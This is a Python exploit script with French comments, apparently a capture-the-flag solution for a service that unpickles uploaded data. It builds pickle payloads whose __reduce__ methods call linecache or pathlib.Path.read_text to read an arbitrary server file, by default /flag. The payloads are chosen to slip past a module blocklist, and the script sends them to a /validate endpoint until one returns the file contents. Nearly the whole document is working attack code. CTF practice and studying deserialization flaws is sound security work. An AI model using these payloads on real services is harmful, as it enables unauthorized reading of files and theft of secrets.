#!/usr/bin/env python3
# Usage: python3 solve_online.py https://<id>.t.ctf.tg [/flag]
# Envoie des pickles lisant TARGET; le service renvoie repr(objet) = le flag.
import sys, json, pickle, urllib.request

BASE = sys.argv[1].rstrip('/')
TARGET = sys.argv[2] if len(sys.argv) > 2 else '/flag'

# Payloads : chacun n'importe qu'un module NON bloqué et renvoie le contenu du fichier.
class Getlines:
    def __reduce__(self):
        import linecache
        return (linecache.getlines, (TARGET,))
class Getline:
    def __reduce__(self):
        import linecache
        return (linecache.getline, (TARGET, 1))
class PathRead:
    def __reduce__(self):
        import pathlib
        return (pathlib.Path.read_text, (pathlib.Path(TARGET),))

candidates = [('linecache.getlines', Getlines()),
              ('linecache.getline',  Getline()),
              ('pathlib.read_text',  PathRead())]

def send(data):
    req = urllib.request.Request(BASE + '/validate', data=data,
                                 headers={'Content-Type': 'application/octet-stream'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return json.loads(e.read().decode())

for name, obj in candidates:
    data = pickle.dumps(obj, protocol=4)
    res = send(data)
    print(f'[{name}] -> {json.dumps(res, ensure_ascii=False)[:300]}')
    if res.get('status') == 'ok':
        print('\n>>> model_summary :', res.get('model_summary'))
        break
